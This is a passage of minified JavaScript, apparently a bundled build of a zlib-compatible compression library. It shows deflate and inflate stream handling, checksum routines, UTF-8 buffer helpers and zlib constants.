        o = n === ~~n ? n : true === n ? 4 : 0, "string" == typeof e ? s.input = i.string2buf(e) : "[object ArrayBuffer]" === l.call(e) ? s.input = new Uint8Array(e) : s.input = e, s.next_in = 0, s.avail_in = s.input.length;
        do {
          if (0 === s.avail_out && (s.output = new a.Buf8(c), s.next_out = 0, s.avail_out = c), 1 !== (t = r.deflate(s, o)) && t !== u) return this.onEnd(t), !(this.ended = true);
          0 !== s.avail_out && (0 !== s.avail_in || 4 !== o && 2 !== o) || ("string" === this.options.to ? this.onData(i.buf2binstring(a.shrinkBuf(s.output, s.next_out))) : this.onData(a.shrinkBuf(s.output, s.next_out)));
        } while ((0 < s.avail_in || 0 === s.avail_out) && 1 !== t);
        return 4 === o ? (t = r.deflateEnd(this.strm), this.onEnd(t), this.ended = true, t === u) : 2 !== o || (this.onEnd(u), !(s.avail_out = 0));
      }, m.prototype.onData = function (e) {
        this.chunks.push(e);
      }, m.prototype.onEnd = function (e) {
        e === u && ("string" === this.options.to ? this.result = this.chunks.join("") : this.result = a.flattenChunks(this.chunks)), this.chunks = [], this.err = e, this.msg = this.strm.msg;
      }, t.Deflate = m, t.deflate = h, t.deflateRaw = function (e, n) {
        return (n = n || {}).raw = true, h(e, n);
      }, t.gzip = function (e, n) {
        return (n = n || {}).gzip = true, h(e, n);
      };
    }, {"./utils/common": 41, "./utils/strings": 42, "./zlib/deflate": 46, "./zlib/messages": 51, "./zlib/zstream": 53}], 40: [function (e, n, t) {
      "use strict";
      var r = e("./zlib/inflate"), a = e("./utils/common"), i = e("./utils/strings"), o = e("./zlib/constants"), s = e("./zlib/messages"), l = e("./zlib/zstream"), u = e("./zlib/gzheader"), c = Object.prototype.toString;
      function d(e) {
        if (!(this instanceof d)) return new d(e);
        this.options = a.assign({chunkSize: 16384, windowBits: 0, to: ""}, e || {});
        var n = this.options;
        n.raw && 0 <= n.windowBits && n.windowBits < 16 && (n.windowBits = -n.windowBits, 0 === n.windowBits && (n.windowBits = -15)), !(0 <= n.windowBits && n.windowBits < 16) || e && e.windowBits || (n.windowBits += 32), 15 < n.windowBits && n.windowBits < 48 && !(15 & n.windowBits) && (n.windowBits |= 15), this.err = 0, this.msg = "", this.ended = false, this.chunks = [], this.strm = new l, this.strm.avail_out = 0;
        var t = r.inflateInit2(this.strm, n.windowBits);
        if (t !== o.Z_OK) throw new Error(s[t]);
        this.header = new u, r.inflateGetHeader(this.strm, this.header);
      }
      function f(e, n) {
        var t = new d(n);
        if (t.push(e, true), t.err) throw t.msg || s[t.err];
        return t.result;
      }
      d.prototype.push = function (e, n) {
        var t, s, l, u, d, f, m = this.strm, h = this.options.chunkSize, p = this.options.dictionary, v = false;
        if (this.ended) return false;
        s = n === ~~n ? n : true === n ? o.Z_FINISH : o.Z_NO_FLUSH, "string" == typeof e ? m.input = i.binstring2buf(e) : "[object ArrayBuffer]" === c.call(e) ? m.input = new Uint8Array(e) : m.input = e, m.next_in = 0, m.avail_in = m.input.length;
        do {
          if (0 === m.avail_out && (m.output = new a.Buf8(h), m.next_out = 0, m.avail_out = h), (t = r.inflate(m, o.Z_NO_FLUSH)) === o.Z_NEED_DICT && p && (f = "string" == typeof p ? i.string2buf(p) : "[object ArrayBuffer]" === c.call(p) ? new Uint8Array(p) : p, t = r.inflateSetDictionary(this.strm, f)), t === o.Z_BUF_ERROR && true === v && (t = o.Z_OK, v = false), t !== o.Z_STREAM_END && t !== o.Z_OK) return this.onEnd(t), !(this.ended = true);
          m.next_out && (0 !== m.avail_out && t !== o.Z_STREAM_END && (0 !== m.avail_in || s !== o.Z_FINISH && s !== o.Z_SYNC_FLUSH) || ("string" === this.options.to ? (l = i.utf8border(m.output, m.next_out), u = m.next_out - l, d = i.buf2string(m.output, l), m.next_out = u, m.avail_out = h - u, u && a.arraySet(m.output, m.output, l, u, 0), this.onData(d)) : this.onData(a.shrinkBuf(m.output, m.next_out)))), 0 === m.avail_in && 0 === m.avail_out && (v = true);
        } while ((0 < m.avail_in || 0 === m.avail_out) && t !== o.Z_STREAM_END);
        return t === o.Z_STREAM_END && (s = o.Z_FINISH), s === o.Z_FINISH ? (t = r.inflateEnd(this.strm), this.onEnd(t), this.ended = true, t === o.Z_OK) : s !== o.Z_SYNC_FLUSH || (this.onEnd(o.Z_OK), !(m.avail_out = 0));
      }, d.prototype.onData = function (e) {
        this.chunks.push(e);
      }, d.prototype.onEnd = function (e) {
        e === o.Z_OK && ("string" === this.options.to ? this.result = this.chunks.join("") : this.result = a.flattenChunks(this.chunks)), this.chunks = [], this.err = e, this.msg = this.strm.msg;
      }, t.Inflate = d, t.inflate = f, t.inflateRaw = function (e, n) {
        return (n = n || {}).raw = true, f(e, n);
      }, t.ungzip = f;
    }, {"./utils/common": 41, "./utils/strings": 42, "./zlib/constants": 44, "./zlib/gzheader": 47, "./zlib/inflate": 49, "./zlib/messages": 51, "./zlib/zstream": 53}], 41: [function (e, n, t) {
      "use strict";
      var r = "undefined" != typeof Uint8Array && "undefined" != typeof Uint16Array && "undefined" != typeof Int32Array;
      t.assign = function (e) {
        for (var n = Array.prototype.slice.call(arguments, 1); n.length;) {
          var t = n.shift();
          if (t) {
            if ("object" != typeof t) throw new TypeError(t + "must be non-object");
            for (var r in t) t.hasOwnProperty(r) && (e[r] = t[r]);
          }
        }
        return e;
      }, t.shrinkBuf = function (e, n) {
        return e.length === n ? e : e.subarray ? e.subarray(0, n) : (e.length = n, e);
      };
      var a = {arraySet: function (e, n, t, r, a) {
        if (n.subarray && e.subarray) e.set(n.subarray(t, t + r), a); else for (var i = 0; i < r; i++) e[a + i] = n[t + i];
      }, flattenChunks: function (e) {
        var n, t, r, a, i, o;
        for (n = r = 0, t = e.length; n < t; n++) r += e[n].length;
        for (o = new Uint8Array(r), n = a = 0, t = e.length; n < t; n++) i = e[n], o.set(i, a), a += i.length;
        return o;
      }}, i = {arraySet: function (e, n, t, r, a) {
        for (var i = 0; i < r; i++) e[a + i] = n[t + i];
      }, flattenChunks: function (e) {
        return [].concat.apply([], e);
      }};
      t.setTyped = function (e) {
        e ? (t.Buf8 = Uint8Array, t.Buf16 = Uint16Array, t.Buf32 = Int32Array, t.assign(t, a)) : (t.Buf8 = Array, t.Buf16 = Array, t.Buf32 = Array, t.assign(t, i));
      }, t.setTyped(r);
    }, {}], 42: [function (e, n, t) {
      "use strict";
      var r = e("./common"), a = true, i = true;
      try {
        String.fromCharCode.apply(null, [0]);
      } catch (e) {
        a = false;
      }
      try {
        String.fromCharCode.apply(null, new Uint8Array(1));
      } catch (e) {
        i = false;
      }
      for (var o = new r.Buf8(256), s = 0; s < 256; s++) o[s] = 252 <= s ? 6 : 248 <= s ? 5 : 240 <= s ? 4 : 224 <= s ? 3 : 192 <= s ? 2 : 1;
      function l(e, n) {
        if (n < 65537 && (e.subarray && i || !e.subarray && a)) return String.fromCharCode.apply(null, r.shrinkBuf(e, n));
        for (var t = "", o = 0; o < n; o++) t += String.fromCharCode(e[o]);
        return t;
      }
      o[254] = o[254] = 1, t.string2buf = function (e) {
        var n, t, a, i, o, s = e.length, l = 0;
        for (i = 0; i < s; i++) 55296 == (64512 & (t = e.charCodeAt(i))) && i + 1 < s && 56320 == (64512 & (a = e.charCodeAt(i + 1))) && (t = 65536 + (t - 55296 << 10) + (a - 56320), i++), l += t < 128 ? 1 : t < 2048 ? 2 : t < 65536 ? 3 : 4;
        for (n = new r.Buf8(l), i = o = 0; o < l; i++) 55296 == (64512 & (t = e.charCodeAt(i))) && i + 1 < s && 56320 == (64512 & (a = e.charCodeAt(i + 1))) && (t = 65536 + (t - 55296 << 10) + (a - 56320), i++), t < 128 ? n[o++] = t : (t < 2048 ? n[o++] = 192 | t >>> 6 : (t < 65536 ? n[o++] = 224 | t >>> 12 : (n[o++] = 240 | t >>> 18, n[o++] = 128 | t >>> 12 & 63), n[o++] = 128 | t >>> 6 & 63), n[o++] = 128 | 63 & t);
        return n;
      }, t.buf2binstring = function (e) {
        return l(e, e.length);
      }, t.binstring2buf = function (e) {
        for (var n = new r.Buf8(e.length), t = 0, a = n.length; t < a; t++) n[t] = e.charCodeAt(t);
        return n;
      }, t.buf2string = function (e, n) {
        var t, r, a, i, s = n || e.length, u = new Array(2 * s);
        for (t = r = 0; t < s;) if ((a = e[t++]) < 128) u[r++] = a; else if (4 < (i = o[a])) u[r++] = 65533, t += i - 1; else {
          for (a &= 2 === i ? 31 : 3 === i ? 15 : 7; 1 < i && t < s;) a = a << 6 | 63 & e[t++], i--;
          1 < i ? u[r++] = 65533 : a < 65536 ? u[r++] = a : (a -= 65536, u[r++] = 55296 | a >> 10 & 1023, u[r++] = 56320 | 1023 & a);
        }
        return l(u, r);
      }, t.utf8border = function (e, n) {
        var t;
        for ((n = n || e.length) > e.length && (n = e.length), t = n - 1; 0 <= t && 128 == (192 & e[t]);) t--;
        return t < 0 || 0 === t ? n : t + o[e[t]] > n ? t : n;
      };
    }, {"./common": 41}], 43: [function (e, n, t) {
      "use strict";
      n.exports = function (e, n, t, r) {
        for (var a = 65535 & e, i = e >>> 16 & 65535, o = 0; 0 !== t;) {
          for (t -= o = 2e3 < t ? 2e3 : t; i = i + (a = a + n[r++] | 0) | 0, --o;) ;
          a %= 65521, i %= 65521;
        }
        return a | i << 16;
      };
    }, {}], 44: [function (e, n, t) {
      "use strict";
      n.exports = {Z_NO_FLUSH: 0, Z_PARTIAL_FLUSH: 1, Z_SYNC_FLUSH: 2, Z_FULL_FLUSH: 3, Z_FINISH: 4, Z_BLOCK: 5, Z_TREES: 6, Z_OK: 0, Z_STREAM_END: 1, Z_NEED_DICT: 2, Z_ERRNO: -1, Z_STREAM_ERROR: -2, Z_DATA_ERROR: -3, Z_BUF_ERROR: -5, Z_NO_COMPRESSION: 0, Z_BEST_SPEED: 1, Z_BEST_COMPRESSION: 9, Z_DEFAULT_COMPRESSION: -1, Z_FILTERED: 1, Z_HUFFMAN_ONLY: 2, Z_RLE: 3, Z_FIXED: 4, Z_DEFAULT_STRATEGY: 0, Z_BINARY: 0, Z_TEXT: 1, Z_UNKNOWN: 2, Z_DEFLATED: 8};
    }, {}], 45: [function (e, n, t) {
      "use strict";
      var r = function () {
        for (var e, n = [], t = 0; t < 256; t++) {
          e = t;
          for (var r = 0; r < 8; r++) e = 1 & e ? 3988292384 ^ e >>> 1 : e >>> 1;
          n[t] = e;
        }
        return n;
      }();
      n.exports = function (e, n, t, a) {
        var i = r, o = a + t;
        e ^= -1;
        for (var s = a; s < o; s++) e = e >>> 8 ^ i[255 & (e ^ n[s])];
        return ~e;
      };
    }, {}], 46: [function (e, n, t) {
      "use strict";
      var r, a = e("../utils/common"), i = e("./trees"), o = e("./adler32"), s = e("./crc32"), l = e("./messages"), u = 0, d = 0, f = -2, p = 2, v = 8, b = 286, w = 30, k = 19, y = 2 * b + 1, x = 15, R = 3, _ = 258, z = _ + R + 1, S = 42, j = 113;
      function D(e) {
        for (var n = e.length; 0 <= --n;) e[n] = 0;
      }
      function P(e) {
        var n = e.state, t = n.pending;
        t > e.avail_out && (t = e.avail_out), 0 !== t && (a.arraySet(e.output, n.pending_buf, n.pending_out, t, e.next_out), e.next_out += t, n.pending_out += t, e.total_out += t, e.avail_out -= t, n.pending -= t, 0 === n.pending && (n.pending_out = 0));
      }
      function T(e, n) {
        i._tr_flush_block(e, 0 <= e.block_start ? e.block_start : -1, e.strstart - e.block_start, n), e.block_start = e.strstart, P(e.strm);
      }
      function q(e, n) {
        e.pending_buf[e.pending++] = n;
      }
      function M(e, n) {
        e.pending_buf[e.pending++] = n >>> 8 & 255, e.pending_buf[e.pending++] = 255 & n;
      }
      function B(e, n) {
        var t, r, a = e.max_chain_length, i = e.strstart, o = e.prev_length, s = e.nice_match, l = e.strstart > e.w_size - z ? e.strstart - (e.w_size - z) : 0, u = e.window, c = e.w_mask, d = e.prev, f = e.strstart + _, m = u[i + o - 1], h = u[i + o];
        e.prev_length >= e.good_match && (a >>= 2), s > e.lookahead && (s = e.lookahead);
        do {
          if (u[(t = n) + o] === h && u[t + o - 1] === m && u[t] === u[i] && u[++t] === u[i + 1]) {
            i += 2, t++;
            do {} while (u[++i] === u[++t] && u[++i] === u[++t] && u[++i] === u[++t] && u[++i] === u[++t] && u[++i] === u[++t] && u[++i] === u[++t] && u[++i] === u[++t] && u[++i] === u[++t] && i < f);
            if (r = _ - (f - i), i = f - _, o < r) {
              if (e.match_start = n, s <= (o = r)) break;
              m = u[i + o - 1], h = u[i + o];
            }
          }
        } while ((n = d[n & c]) > l && 0 != --a);
        return o <= e.lookahead ? o : e.lookahead;
      }
      function W(e) {
        var n, t, r, i, l, u, c, d, f, m, h = e.w_size;
        do {
          if (i = e.window_size - e.lookahead - e.strstart, e.strstart >= h + (h - z)) {
            for (a.arraySet(e.window, e.window, h, h, 0), e.match_start -= h, e.strstart -= h, e.block_start -= h, n = t = e.hash_size; r = e.head[--n], e.head[n] = h <= r ? r - h : 0, --t;) ;
            for (n = t = h; r = e.prev[--n], e.prev[n] = h <= r ? r - h : 0, --t;) ;
            i += h;
          }
          if (0 === e.strm.avail_in) break;
          if (u = e.strm, c = e.window, d = e.strstart + e.lookahead, m = undefined, (f = i) < (m = u.avail_in) && (m = f), t = 0 === m ? 0 : (u.avail_in -= m, a.arraySet(c, u.input, u.next_in, m, d), 1 === u.state.wrap ? u.adler = o(u.adler, c, m, d) : 2 === u.state.wrap && (u.adler = s(u.adler, c, m, d)), u.next_in += m, u.total_in += m, m), e.lookahead += t, e.lookahead + e.insert >= R) for (l = e.strstart - e.insert, e.ins_h = e.window[l], e.ins_h = (e.ins_h << e.hash_shift ^ e.window[l + 1]) & e.hash_mask; e.insert && (e.ins_h = (e.ins_h << e.hash_shift ^ e.window[l + R - 1]) & e.hash_mask, e.prev[l & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = l, l++, e.insert--, !(e.lookahead + e.insert < R));) ;
        } while (e.lookahead < z && 0 !== e.strm.avail_in);
      }
      function L(e, n) {
        for (var t, r;;) {
          if (e.lookahead < z) {
            if (W(e), e.lookahead < z && n === u) return 1;
            if (0 === e.lookahead) break;
          }
          if (t = 0, e.lookahead >= R && (e.ins_h = (e.ins_h << e.hash_shift ^ e.window[e.strstart + R - 1]) & e.hash_mask, t = e.prev[e.strstart & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = e.strstart), 0 !== t && e.strstart - t <= e.w_size - z && (e.match_length = B(e, t)), e.match_length >= R) if (r = i._tr_tally(e, e.strstart - e.match_start, e.match_length - R), e.lookahead -= e.match_length, e.match_length <= e.max_lazy_match && e.lookahead >= R) {
            for (e.match_length--; e.strstart++, e.ins_h = (e.ins_h << e.hash_shift ^ e.window[e.strstart + R - 1]) & e.hash_mask, t = e.prev[e.strstart & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = e.strstart, 0 != --e.match_length;) ;
            e.strstart++;
          } else e.strstart += e.match_length, e.match_length = 0, e.ins_h = e.window[e.strstart], e.ins_h = (e.ins_h << e.hash_shift ^ e.window[e.strstart + 1]) & e.hash_mask; else r = i._tr_tally(e, 0, e.window[e.strstart]), e.lookahead--, e.strstart++;
          if (r && (T(e, false), 0 === e.strm.avail_out)) return 1;
        }
        return e.insert = e.strstart < R - 1 ? e.strstart : R - 1, 4 === n ? (T(e, true), 0 === e.strm.avail_out ? 3 : 4) : e.last_lit && (T(e, false), 0 === e.strm.avail_out) ? 1 : 2;
      }
      function $(e, n) {
        for (var t, r, a;;) {
          if (e.lookahead < z) {
            if (W(e), e.lookahead < z && n === u) return 1;
            if (0 === e.lookahead) break;
          }
          if (t = 0, e.lookahead >= R && (e.ins_h = (e.ins_h << e.hash_shift ^ e.window[e.strstart + R - 1]) & e.hash_mask, t = e.prev[e.strstart & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = e.strstart), e.prev_length = e.match_length, e.prev_match = e.match_start, e.match_length = R - 1, 0 !== t && e.prev_length < e.max_lazy_match && e.strstart - t <= e.w_size - z && (e.match_length = B(e, t), e.match_length <= 5 && (1 === e.strategy || e.match_length === R && 4096 < e.strstart - e.match_start) && (e.match_length = R - 1)), e.prev_length >= R && e.match_length <= e.prev_length) {
            for (a = e.strstart + e.lookahead - R, r = i._tr_tally(e, e.strstart - 1 - e.prev_match, e.prev_length - R), e.lookahead -= e.prev_length - 1, e.prev_length -= 2; ++e.strstart <= a && (e.ins_h = (e.ins_h << e.hash_shift ^ e.window[e.strstart + R - 1]) & e.hash_mask, t = e.prev[e.strstart & e.w_mask] = e.head[e.ins_h], e.head[e.ins_h] = e.strstart), 0 != --e.prev_length;) ;
            if (e.match_available = 0, e.match_length = R - 1, e.strstart++, r && (T(e, false), 0 === e.strm.avail_out)) return 1;
          } else if (e.match_available) {
            if ((r = i._tr_tally(e, 0, e.window[e.strstart - 1])) && T(e, false), e.strstart++, e.lookahead--, 0 === e.strm.avail_out) return 1;
          } else e.match_available = 1, e.strstart++, e.lookahead--;
        }
        return e.match_available && (r = i._tr_tally(e, 0, e.window[e.strstart - 1]), e.match_available = 0), e.insert = e.strstart < R - 1 ? e.strstart : R - 1, 4 === n ? (T(e, true), 0 === e.strm.avail_out ? 3 : 4) : e.last_lit && (T(e, false), 0 === e.strm.avail_out) ? 1 : 2;
      }
      function N(e, n, t, r, a) {
        this.good_length = e, this.max_lazy = n, this.nice_length = t, this.max_chain = r, this.func = a;
      }
      function U() {
        this.strm = null, this.status = 0, this.pending_buf = null, this.pending_buf_size = 0, this.pending_out = 0, this.pending = 0, this.wrap = 0, this.gzhead = null, this.gzindex = 0, this.method = v, this.last_flush = -1, this.w_size = 0, this.w_bits = 0, this.w_mask = 0, this.window = null, this.window_size = 0, this.prev = null, this.head = null, this.ins_h = 0, this.hash_size = 0, this.hash_bits = 0, this.hash_mask = 0, this.hash_shift = 0, this.block_start = 0, this.match_length = 0, this.prev_match = 0, this.match_available = 0, this.strstart = 0, this.match_start = 0, this.lookahead = 0, this.prev_length = 0, this.max_chain_length = 0, this.max_lazy_match = 0, this.level = 0, this.strategy = 0, this.good_match = 0, this.nice_match = 0, this.dyn_ltree = new a.Buf16(2 * y), this.dyn_dtree = new a.Buf16(2 * (2 * w + 1)), this.bl_tree = new a.Buf16(2 * (2 * k + 1)), D(this.dyn_ltree), D(this.dyn_dtree), D(this.bl_tree), this.l_desc = null, this.d_desc = null, this.bl_desc = null, this.bl_count = new a.Buf16(x + 1), this.heap = new a.Buf16(2 * b + 1), D(this.heap), this.heap_len = 0, this.heap_max = 0, this.depth = new a.Buf16(2 * b + 1), D(this.depth), this.l_buf = 0, this.lit_bufsize = 0, this.last_lit = 0, this.d_buf = 0, this.opt_len = 0, this.static_len = 0, this.matches = 0, this.insert = 0, this.bi_buf = 0, this.bi_valid = 0;
      }
      function Z(e) {
        var n;
        return e && e.state ? (e.total_in = e.total_out = 0, e.data_type = p, (n = e.state).pending = 0, n.pending_out = 0, n.wrap < 0 && (n.wrap = -n.wrap), n.status = n.wrap ? S : j, e.adler = 2 === n.wrap ? 0 : 1, n.last_flush = u, i._tr_init(n), d) : (e.msg = l[f], f);
      }
      function H(e) {
        var n = Z(e);
        return n === d && function (e) {
          e.window_size = 2 * e.w_size, D(e.head), e.max_lazy_match = r[e.level].max_lazy, e.good_match = r[e.level].good_length, e.nice_match = r[e.level].nice_length, e.max_chain_length = r[e.level].max_chain, e.strstart = 0, e.block_start = 0, e.lookahead = 0, e.insert = 0, e.match_length = e.prev_length = R - 1, e.match_available = 0, e.ins_h = 0;
        }(e.state), n;
      }
      function J(e, n, t, r, i, o) {
        if (!e) return f;
        var s = 1;
        if (-1 === n && (n = 6), r < 0 ? (s = 0, r = -r) : 15 < r && (s = 2, r -= 16), i < 1 || 9 < i || t !== v || r < 8 || 15 < r || n < 0 || 9 < n || o < 0 || 4 < o) return e.msg = l[f], f;
        8 === r && (r = 9);
        var l = new U;
        return (e.state = l).strm = e, l.wrap = s, l.gzhead = null, l.w_bits = r, l.w_size = 1 << l.w_bits, l.w_mask = l.w_size - 1, l.hash_bits = i + 7, l.hash_size = 1 << l.hash_bits, l.hash_mask = l.hash_size - 1, l.hash_shift = ~~((l.hash_bits + R - 1) / R), l.window = new a.Buf8(2 * l.w_size), l.head = new a.Buf16(l.hash_size), l.prev = new a.Buf16(l.w_size), l.lit_bufsize = 1 << i + 6, l.pending_buf_size = 4 * l.lit_bufsize, l.pending_buf = new a.Buf8(l.pending_buf_size), l.d_buf = 1 * l.lit_bufsize, l.l_buf = 3 * l.lit_bufsize, l.level = n, l.strategy = o, l.method = t, H(e);
      }
      r = [new N(0, 0, 0, 0, function (e, n) {
        var t = 65535;
        for (t > e.pending_buf_size - 5 && (t = e.pending_buf_size - 5);;) {
          if (e.lookahead <= 1) {
            if (W(e), 0 === e.lookahead && n === u) return 1;
            if (0 === e.lookahead) break;
          }
          e.strstart += e.lookahead, e.lookahead = 0;
          var r = e.block_start + t;
          if ((0 === e.strstart || e.strstart >= r) && (e.lookahead = e.strstart - r, e.strstart = r, T(e, false), 0 === e.strm.avail_out)) return 1;
          if (e.strstart - e.block_start >= e.w_size - z && (T(e, false), 0 === e.strm.avail_out)) return 1;
        }
        return e.insert = 0, 4 === n ? (T(e, true), 0 === e.strm.avail_out ? 3 : 4) : (e.strstart > e.block_start && (T(e, false), e.strm.avail_out), 1);
      }), new N(4, 4, 8, 4, L), new N(4, 5, 16, 8, L), new N(4, 6, 32, 32, L), new N(4, 4, 16, 16, $), new N(8, 16, 32, 32, $), new N(8, 16, 128, 128, $), new N(8, 32, 128, 256, $), new N(32, 128, 258, 1024, $), new N(32, 258, 258, 4096, $)], t.deflateInit = function (e, n) {
        return J(e, n, v, 15, 8, 0);
      }, t.deflateInit2 = J, t.deflateReset = H, t.deflateResetKeep = Z, t.deflateSetHeader = function (e, n) {
        return e && e.state ? 2 !== e.state.wrap ? f : (e.state.gzhead = n, d) : f;
      }, t.deflate = function (e, n) {
        var t, a, o, l;
        if (!e || !e.state || 5 < n || n < 0) return e ? (e.msg = l[f], f) : f;
        if (a = e.state, !e.output || !e.input && 0 !== e.avail_in || 666 === a.status && 4 !== n) return e.msg = l[0 === e.avail_out ? -5 : f], 0 === e.avail_out ? -5 : f;
        if (a.strm = e, t = a.last_flush, a.last_flush = n, a.status === S) if (2 === a.wrap) e.adler = 0, q(a, 31), q(a, 139), q(a, 8), a.gzhead ? (q(a, (a.gzhead.text ? 1 : 0) + (a.gzhead.hcrc ? 2 : 0) + (a.gzhead.extra ? 4 : 0) + (a.gzhead.name ? 8 : 0) + (a.gzhead.comment ? 16 : 0)), q(a, 255 & a.gzhead.time), q(a, a.gzhead.time >> 8 & 255), q(a, a.gzhead.time >> 16 & 255), q(a, a.gzhead.time >> 24 & 255), q(a, 9 === a.level ? 2 : 2 <= a.strategy || a.level < 2 ? 4 : 0), q(a, 255 & a.gzhead.os), a.gzhead.extra && a.gzhead.extra.length && (q(a, 255 & a.gzhead.extra.length), q(a, a.gzhead.extra.length >> 8 & 255)), a.gzhead.hcrc && (e.adler = s(e.adler, a.pending_buf, a.pending, 0)), a.gzindex = 0, a.status = 69) : (q(a, 0), q(a, 0), q(a, 0), q(a, 0), q(a, 0), q(a, 9 === a.level ? 2 : 2 <= a.strategy || a.level < 2 ? 4 : 0), q(a, 3), a.status = j); else {
          var m = v + (a.w_bits - 8 << 4) << 8;
          m |= (2 <= a.strategy || a.level < 2 ? 0 : a.level < 6 ? 1 : 6 === a.level ? 2 : 3) << 6, 0 !== a.strstart && (m |= 32), m += 31 - m % 31, a.status = j, M(a, m), 0 !== a.strstart && (M(a, e.adler >>> 16), M(a, 65535 & e.adler)), e.adler = 1;
        }
        if (69 === a.status) if (a.gzhead.extra) {
          for (o = a.pending; a.gzindex < (65535 & a.gzhead.extra.length) && (a.pending !== a.pending_buf_size || (a.gzhead.hcrc && a.pending > o && (e.adler = s(e.adler, a.pending_buf, a.pending - o, o)), P(e), o = a.pending, a.pending !== a.pending_buf_size));) q(a, 255 & a.gzhead.extra[a.gzindex]), a.gzindex++;
          a.gzhead.hcrc && a.pending > o && (e.adler = s(e.adler, a.pending_buf, a.pending - o, o)), a.gzindex === a.gzhead.extra.length && (a.gzindex = 0, a.status = 73);
        } else a.status = 73;
        if (73 === a.status) if (a.gzhead.name) {
          o = a.pending;
          do {
            if (a.pending === a.pending_buf_size && (a.gzhead.hcrc && a.pending > o && (e.adler = s(e.adler, a.pending_buf, a.pending - o, o)), P(e), o = a.pending, a.pending === a.pending_buf_size)) {
              l = 1;
              break;
            }
            l = a.gzindex < a.gzhead.name.length ? 255 & a.gzhead.name.charCodeAt(a.gzindex++) : 0, q(a, l);
          } while (0 !== l);
          a.gzhead.hcrc && a.pending > o && (e.adler = s(e.adler, a.pending_buf, a.pending - o, o)), 0 === l && (a.gzindex = 0, a.status = 91);
        } else a.status = 91;
        if (91 === a.status) if (a.gzhead.comment) {
          o = a.pending;
          do {
            if (a.pending === a.pending_buf_size && (a.gzhead.hcrc && a.pending > o && (e.adler = s(e.adler, a.pending_buf, a.pending - o, o)), P(e), o = a.pending, a.pending === a.pending_buf_size)) {
              l = 1;
              break;
            }
            l = a.gzindex < a.gzhead.comment.length ? 255 & a.gzhead.comment.charCodeAt(a.gzindex++) : 0, q(a, l);
          } while (0 !== l);
          a.gzhead.hcrc && a.pending > o && (e.adler = s(e.adler, a.pending_buf, a.pending - o, o)), 0 === l && (a.status = 103);
        } else a.status = 103;
        if (103 === a.status && (a.gzhead.hcrc ? (a.pending + 2 > a.pending_buf_size && P(e), a.pending + 2 <= a.pending_buf_size && (q(a, 255 & e.adler), q(a, e.adler >> 8 & 255), e.adler = 0, a.status = j)) : a.status = j), 0 !== a.pending) {
          if (P(e), 0 === e.avail_out) return a.last_flush = -1, d;
        } else if (0 === e.avail_in && (n << 1) - (4 < n ? 9 : 0) <= (t << 1) - (4 < t ? 9 : 0) && 4 !== n) return e.msg = l[-5], -5;
        if (666 === a.status && 0 !== e.avail_in) return e.msg = l[-5], -5;
        if (0 !== e.avail_in || 0 !== a.lookahead || n !== u && 666 !== a.status) {
          var h = 2 === a.strategy ? function (e, n) {
            for (var t;;) {
              if (0 === e.lookahead && (W(e), 0 === e.lookahead)) {
                if (n === u) return 1;
                break;
              }
              if (e.match_length = 0, t = i._tr_tally(e, 0, e.window[e.strstart]), e.lookahead--, e.strstart++, t && (T(e, false), 0 === e.strm.avail_out)) return 1;
            }
            return e.insert = 0, 4 === n ? (T(e, true), 0 === e.strm.avail_out ? 3 : 4) : e.last_lit && (T(e, false), 0 === e.strm.avail_out) ? 1 : 2;
          }(a, n) : 3 === a.strategy ? function (e, n) {
            for (var t, r, a, o, s = e.window;;) {
              if (e.lookahead <= _) {
                if (W(e), e.lookahead <= _ && n === u) return 1;
                if (0 === e.lookahead) break;
              }
              if (e.match_length = 0, e.lookahead >= R && 0 < e.strstart && (r = s[a = e.strstart - 1]) === s[++a] && r === s[++a] && r === s[++a]) {
                o = e.strstart + _;
                do {} while (r === s[++a] && r === s[++a] && r === s[++a] && r === s[++a] && r === s[++a] && r === s[++a] && r === s[++a] && r === s[++a] && a < o);
                e.match_length = _ - (o - a), e.match_length > e.lookahead && (e.match_length = e.lookahead);
              }
              if (e.match_length >= R ? (t = i._tr_tally(e, 1, e.match_length - R), e.lookahead -= e.match_length, e.strstart += e.match_length, e.match_length = 0) : (t = i._tr_tally(e, 0, e.window[e.strstart]), e.lookahead--, e.strstart++), t && (T(e, false), 0 === e.strm.avail_out)) return 1;
            }
            return e.insert = 0, 4 === n ? (T(e, true), 0 === e.strm.avail_out ? 3 : 4) : e.last_lit && (T(e, false), 0 === e.strm.avail_out) ? 1 : 2;
          }(a, n) : r[a.level].func(a, n);
          if (3 !== h && 4 !== h || (a.status = 666), 1 === h || 3 === h) return 0 === e.avail_out && (a.last_flush = -1), d;
          if (2 === h && (1 === n ? i._tr_align(a) : 5 !== n && (i._tr_stored_block(a, 0, 0, false), 3 === n && (D(a.head), 0 === a.lookahead && (a.strstart = 0, a.block_start = 0, a.insert = 0))), P(e), 0 === e.avail_out)) return a.last_flush = -1, d;
        }
        return 4 !== n ? d : a.wrap <= 0 ? 1 : (2 === a.wrap ? (q(a, 255 & e.adler), q(a, e.adler >> 8 & 255), q(a, e.adler >> 16 & 255), q(a, e.adler >> 24 & 255), q(a, 255 & e.total_in), q(a, e.total_in >> 8 & 255), q(a, e.total_in >> 16 & 255), q(a, e.total_in >> 24 & 255)) : (M(a, e.adler >>> 16), M(a, 65535 & e.adler)), P(e), 0 < a.wrap && (a.wrap = -a.wrap), 0 !== a.pending ? d : 1);
      }, t.deflateEnd = function (e) {
        var n;
        return e && e.state ? (n = e.state.status) !== S && 69 !== n && 73 !== n && 91 !== n && 103 !== n && n !== j && 666 !== n ? (e.msg = l[f], f) : (e.state = null, n === j ? (e.msg = l[-3], -3) : d) : f;
      }, t.deflateSetDictionary = function (e, n) {
        var t, r, i, s, l, u, c, m, h = n.length;
        if (!e || !e.state) return f;
        if (2 === (s = (t = e.state).wrap) || 1 === s && t.status !== S || t.lookahead) return f;
        for (1 === s && (e.adler = o(e.adler, n, h, 0)), t.wrap = 0, h >= t.w_size && (0 === s && (D(t.head), t.strstart = 0, t.block_start = 0, t.insert = 0), m = new a.Buf8(t.w_size), a.arraySet(m, n, h - t.w_size, t.w_size, 0), n = m, h = t.w_size), l = e.avail_in, u = e.next_in, c = e.input, e.avail_in = h, e.next_in = 0, e.input = n, W(t); t.lookahead >= R;) {
          for (r = t.strstart, i = t.lookahead - (R - 1); t.ins_h = (t.ins_h << t.hash_shift ^ t.window[r + R - 1]) & t.hash_mask, t.prev[r & t.w_mask] = t.head[t.ins_h], t.head[t.ins_h] = r, r++, --i;) ;
